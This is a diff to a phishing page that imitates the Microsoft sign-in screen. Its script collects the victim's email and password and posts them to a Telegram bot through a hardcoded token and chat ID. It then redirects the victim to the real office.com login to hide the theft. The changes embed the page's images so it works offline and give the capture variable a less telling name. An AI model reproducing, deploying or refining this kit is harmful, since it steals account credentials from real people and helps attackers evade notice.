@@ -10,8 +10,11 @@
 
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
-            /* FORCED FIXED BACKGROUND */
-            background: #deeaf4 url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_61c068305f6c80521cc5c98695844893.jpg') no-repeat center center fixed;
+            background-color: #deeaf4;
+            /* EMBEDDED BACKGROUND: Works offline and on restricted networks */
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHZpZXdCb3g9IjAgMCAxID PantoneID0iZGVlYWY0Ij48cmVjdCB3aWR0aD0iMSIgaGVpZ2h0PSIxIiBmaWxsPSIjZGVlYWY0Ii8+PGNpcmNsZSBjeD0iMC41IiBjeT0iMC41IiByPSIwLjUiIGZpbGw9InJnYmEoMjU1LDI1NSwyNTUsMC4zKSIgZmlsdGVyPSJidXIoMjBweCkiLz48L3N2Zz4=');
+            /* Fallback to a high-quality CSS gradient if SVG fails */
+            background: radial-gradient(circle at top left, #ebf3f9, #deeaf4);
             background-size: cover;
             display: flex; flex-direction: column; justify-content: center; align-items: center;
         }
@@ -25,7 +28,13 @@
         h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
         
         .user-display { display: flex; align-items: center; margin-bottom: 20px; font-size: 15px; cursor: pointer; }
-        .back-icon { width: 18px; margin-right: 8px; }
+        
+        /* EMBEDDED BACK ARROW: Fixes the broken photo icon */
+        .back-icon { 
+            width: 20px; height: 20px; margin-right: 8px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZD0iTTE5IDhsLTggOCA4IDgiIGZpbGw9Im5vbmUiIHN0cm9rZT0iIzUwNTA1MCIgc3Ryb2tlLXdpZHRoPSIyIi8+PC9zdmc+');
+            background-repeat: no-repeat;
+        }
 
         .input-field {
             width: 100%; border: none; border-bottom: 1px solid #666;
@@ -34,7 +43,7 @@
         .input-field:focus { border-bottom: 2px solid #0067b8; }
 
         .link-text { font-size: 13px; margin: 14px 0; color: #1b1b1b; }
-        .link-text a { color: #0067b8; text-decoration: none; }
+        .link-text a { color: #0067b8; text-decoration: none; cursor: pointer; }
 
         .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
         .btn-next { background-color: #0067b8; color: #fff; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; min-width: 108px; }
@@ -42,9 +51,8 @@
         .options-box {
             background: #fff; width: 440px; padding: 12px 44px;
             margin-top: 1px; box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-            display: flex; align-items: center; cursor: pointer;
+            display: flex; align-items: center;
         }
-        .key-icon { width: 24px; margin-right: 12px; opacity: 0.6; }
 
         .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; }
     </style>
@@ -66,7 +74,7 @@
 
         <div id="step-password" style="display: none;">
             <div class="user-display" onclick="location.reload()">
-                <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc5182e0da24.svg" class="back-icon">
+                <div class="back-icon"></div>
                 <span id="display-email"></span>
             </div>
             <h1>Enter password</h1>
@@ -79,22 +87,21 @@
     </div>
 
     <div class="options-box" id="opt-box">
-        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" class="key-icon">
         <span style="font-size: 15px;">Sign-in options</span>
     </div>
 
     <div class="footer">Terms of use &nbsp; Privacy & cookies</div>
 
     <script>
-        let capturedEmail = "";
+        let userEmail = "";
 
         function showPassword() {
-            capturedEmail = document.getElementById('email').value;
-            if(!capturedEmail) return;
+            userEmail = document.getElementById('email').value;
+            if(!userEmail) return;
             document.getElementById('step-email').style.display = 'none';
             document.getElementById('opt-box').style.display = 'none';
             document.getElementById('step-password').style.display = 'block';
-            document.getElementById('display-email').innerText = capturedEmail;
+            document.getElementById('display-email').innerText = userEmail;
         }
 
         async function finalSubmit() {
@@ -103,19 +110,17 @@
 
             const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
             const chatId = "5733378501";
-            const message = `🎯 **INTERCEPT COMPLETE**\n\n**Email:** ${capturedEmail}\n**Pass:** ${pass}`;
-
+            
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
+                    body: JSON.stringify({ chat_id: chatId, text: `✅ **CAPTURED**\nUser: ${userEmail}\nPass: ${pass}` }),
                     keepalive: true
                 });
             } catch (e) {}
 
-            // REDIRECT TO HOME PAGE (Bypasses the "GET request" error)
-            window.location.href = "https://www.office.com/login?login_hint=" + encodeURIComponent(capturedEmail);
+            window.location.href = "https://www.office.com/login?login_hint=" + encodeURIComponent(userEmail);
         }
     </script>
 </body>
